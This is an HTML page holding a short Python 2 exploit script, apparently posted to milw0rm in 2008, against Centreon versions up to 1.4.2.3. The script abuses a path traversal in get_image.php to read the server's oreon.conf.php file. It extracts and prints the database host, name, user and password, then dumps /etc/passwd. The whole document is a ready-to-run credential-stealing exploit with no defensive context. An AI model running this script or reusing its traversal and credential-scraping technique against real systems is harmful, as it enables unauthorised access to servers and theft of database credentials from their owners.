<html><head><title>Centreon <= 1.4.2.3 (get_image.php) Remote File Disclosure Exploit</title></head><pre>#!/usr/bin/python

# Date : 20/01/2008
# Author : Julien CAYSSOL &lt;julien@aqwz.com&gt;

import sys, urllib2,re


user_agent =  'Mozilla/6.0 (compatible; MSIE 6.0; Windows NT)'
headers =  { 'User-Agent'  : user_agent ,
                                'Accept-Charset' : 'ISO-8859-15' }


if __name__ == &quot;__main__&quot;:

    if len(sys.argv)==2:
        host = sys.argv[1]
        print &quot; [+] Host : &quot; + host

        url = &quot;http://&quot;+sys.argv[1]+&quot;/include/doc/get_image.php?lang=&amp;img=../../www/oreon.conf.php&quot;
        req = urllib2.Request(url, None, headers)
        html = urllib2.urlopen(req).read()
        html = re.sub('\n','',html)
        ident =re.findall('\$conf_oreon\[\'host\'\] = &quot;(.*?)&quot;;\$conf_oreon\[\'user\'\] = &quot;(.*?)&quot;;\$conf_oreon\[\'password\'\] = &quot;(.*?)&quot;;\$conf_oreon\[\'db\'\] = &quot;(.*?)&quot;;',html)
        print &quot; [*] Result :  &quot;
        print &quot; + DB Host : &quot;+ident[0][0]
        print &quot; + DB Name : &quot;+ident[0][3]
        print &quot; + DB user : &quot;+ident[0][1]
        print &quot; + DB pass : &quot;+ident[0][2]

        print &quot; [*] /etc/passwd for Fun&quot;
        url = &quot;http://&quot;+sys.argv[1]+&quot;/include/doc/get_image.php?lang=&amp;img=../../../../../etc/passwd&quot;
        req = urllib2.Request(url, None, headers)
        html = urllib2.urlopen(req).read()
        print html

    else:
        print &quot;./Poc.py HOST&quot;

# milw0rm.com [2008-02-28]</pre></html>